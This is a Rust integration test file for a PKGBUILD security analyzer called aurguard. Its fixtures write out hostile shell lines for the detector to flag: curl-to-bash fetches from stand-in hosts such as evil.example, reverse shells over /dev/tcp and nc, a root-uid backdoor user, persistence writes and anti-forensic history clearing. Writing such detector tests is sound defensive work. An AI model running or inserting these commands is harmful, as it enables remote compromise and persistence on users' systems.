//! Integration tests exercising the analyzer end-to-end through the public
//! library API, against realistic PKGBUILD fixtures.

use aurguard::config::Config;
use aurguard::i18n::Lang;
use aurguard::pkgbuild::{analyze, PkgSources};
use aurguard::report::{Risk, Severity};
use chrono::{DateTime, Utc};

fn now() -> DateTime<Utc> {
    DateTime::from_timestamp(1_705_000_000, 0).unwrap()
}

fn codes(report: &aurguard::report::Report) -> Vec<&'static str> {
    report.findings.iter().map(|f| f.code).collect()
}

/// A realistic clean PKGBUILD should produce no findings.
#[test]
fn clean_package_is_clean() {
    let pkgbuild = r#"
pkgname=ripgrep
pkgver=14.1.0
pkgrel=1
arch=('x86_64')
url="https://github.com/BurntSushi/ripgrep"
license=('MIT')
source=("https://github.com/BurntSushi/ripgrep/archive/$pkgver.tar.gz")
sha256sums=('abc123')

build() {
  cd "$srcdir/ripgrep-$pkgver"
  cargo build --release --locked
}

package() {
  install -Dm755 "target/release/rg" "$pkgdir/usr/bin/rg"
}
"#;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert_eq!(report.risk, Risk::Clean, "findings: {:?}", codes(&report));
}

/// A deliberately malicious PKGBUILD should trip multiple CRITICAL rules.
#[test]
fn malicious_package_is_critical() {
    let pkgbuild = r#"
pkgname=shady-tool
pkgver=1.0
pkgrel=1
source=('http://1.2.3.4/payload.tar.gz')
sha256sums=('SKIP')

prepare() {
  curl https://evil.example/stage1.sh | bash
  echo "ZXZpbA==" | base64 -d | sh
}

build() {
  eval "$obfuscated"
  chmod +x ./runme
  ./runme
}
"#;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert_eq!(report.risk, Risk::Critical);
    let c = codes(&report);
    for expect in [
        "INSECURE_SOURCE",
        "IP_SOURCE",
        "CURL_PIPE_SH",
        "BASE64_PIPE_SH",
        "EVAL",
        "CHMOD_EXEC",
    ] {
        assert!(c.contains(&expect), "missing {expect}; got {c:?}");
    }
}

/// A `.install` scriptlet with a hidden payload must be analyzed too.
#[test]
fn install_scriptlet_is_analyzed() {
    let pkgbuild = "pkgname=t\npkgver=1\npkgrel=1\ninstall=t.install\n";
    let install = r#"
post_install() {
  curl https://evil/backdoor | bash
}
"#;
    let sources = PkgSources {
        pkgbuild: pkgbuild.into(),
        install_scripts: vec![("t.install".into(), install.into())],
    };
    let report = analyze(None, &sources, &Config::default(), None, now());
    let c = codes(&report);
    assert!(c.contains(&"CURL_PIPE_SH"), "got {c:?}");
    assert!(c.contains(&"INSTALL_HOOK"));
}

/// Obfuscation that defeats substring matching is still caught by the AST pass:
/// `eval` appearing only in a comment or string must NOT fire, but a real
/// `eval` command must.
#[test]
fn ast_pass_distinguishes_code_from_text() {
    let benign = "build() {\n  echo 'do not eval this'  # eval mentioned\n}";
    let malicious = "build() {\n  eval \"$cmd\"\n}";
    let b = analyze(
        None,
        &PkgSources::from_pkgbuild(benign),
        &Config::default(),
        None,
        now(),
    );
    let m = analyze(
        None,
        &PkgSources::from_pkgbuild(malicious),
        &Config::default(),
        None,
        now(),
    );
    assert!(!codes(&b).contains(&"EVAL"));
    assert!(codes(&m).contains(&"EVAL"));
}

/// Inline `# aurguard:ignore` suppresses a specific finding on that line.
#[test]
fn inline_ignore_directive() {
    let pkgbuild = "build() {\n  eval \"$x\" # aurguard:ignore EVAL\n}";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(!codes(&report).contains(&"EVAL"));
}

/// Config `[rules].ignore` drops a finding globally; severity downgrades risk.
#[test]
fn config_ignore_changes_risk() {
    let pkgbuild = "source=('https://unknown.ru/x.tar.gz')\nsha256sums=('a')\n";
    let mut cfg = Config::default();
    let before = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &cfg,
        None,
        now(),
    );
    assert_eq!(before.risk, Risk::Risky);

    cfg.rules.ignore.push("UNKNOWN_SOURCE".into());
    let after = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &cfg,
        None,
        now(),
    );
    assert_eq!(after.risk, Risk::Clean);
}

/// New high-signal security rules catch advanced attack shapes.
#[test]
fn advanced_security_rules() {
    let cases: &[(&str, &str)] = &[
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "REVERSE_SHELL"),
        ("nc -e /bin/sh attacker.example 9001", "REVERSE_SHELL"),
        ("chmod u+s /usr/bin/something", "SUID_BIT"),
        ("useradd -ou 0 -g 0 backdoor", "USER_MGMT"),
        ("echo 'evil' >> $HOME/.bashrc", "HOME_PERSIST"),
        ("cp payload /etc/profile.d/x.sh", "SYSTEM_PATH_WRITE"),
        ("history -c", "ANTI_FORENSIC"),
        (
            "python -c \"exec(__import__('base64').b64decode('...'))\"",
            "PYTHON_ENC_EXEC",
        ),
        ("printf '\\x62\\x61\\x73\\x68' | sh", "OBFUSCATION"),
    ];
    for (line, code) in cases {
        let pkgbuild = format!("build() {{\n  {line}\n}}");
        let report = analyze(
            None,
            &PkgSources::from_pkgbuild(pkgbuild),
            &Config::default(),
            None,
            now(),
        );
        assert!(
            codes(&report).contains(code),
            "line {line:?} should trigger {code}, got {:?}",
            codes(&report)
        );
    }
}

/// A write into $pkgdir is NOT flagged as a system-path write.
#[test]
fn pkgdir_write_is_allowed() {
    let pkgbuild = "package() {\n  install -Dm644 x \"$pkgdir/etc/x.conf\"\n}";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(!codes(&report).contains(&"SYSTEM_PATH_WRITE"));
}

/// URL shorteners are flagged distinctly from generic unknown domains.
#[test]
fn url_shortener_flagged() {
    let pkgbuild = "source=('https://bit.ly/xyz')\nsha256sums=('a')\n";
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert!(codes(&report).contains(&"URL_SHORTENER"));
}

/// Findings render in the configured language (Turkish here).
#[test]
fn findings_localized_turkish() {
    let pkgbuild = "build() {\n  eval \"$x\"\n}";
    let mut cfg = Config::default();
    cfg.ui.lang = Lang::Tr;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &cfg,
        None,
        now(),
    );
    let eval = report.findings.iter().find(|f| f.code == "EVAL").unwrap();
    assert!(eval.message.contains("eval"));
    assert!(eval.message.contains("dinamik"), "got {:?}", eval.message);
}

/// The same analysis in Azerbaijani localizes the dynamic host argument.
#[test]
fn dynamic_arg_localized_azerbaijani() {
    let pkgbuild = "source=('https://unknown.ru/x.tar.gz')\nsha256sums=('a')\n";
    let mut cfg = Config::default();
    cfg.ui.lang = Lang::Az;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &cfg,
        None,
        now(),
    );
    let f = report
        .findings
        .iter()
        .find(|f| f.code == "UNKNOWN_SOURCE")
        .unwrap();
    assert!(f.message.contains("unknown.ru"));
    assert!(f.message.contains("Naməlum"), "got {:?}", f.message);
}

/// The highest-severity finding sorts first in the report.
#[test]
fn findings_sorted_by_severity() {
    let pkgbuild = r#"
source=('https://unknown.ru/x.tar.gz')
sha256sums=('SKIP')
build() { eval "$x"; }
"#;
    let report = analyze(
        None,
        &PkgSources::from_pkgbuild(pkgbuild),
        &Config::default(),
        None,
        now(),
    );
    assert_eq!(report.findings[0].severity, Severity::Critical);
}
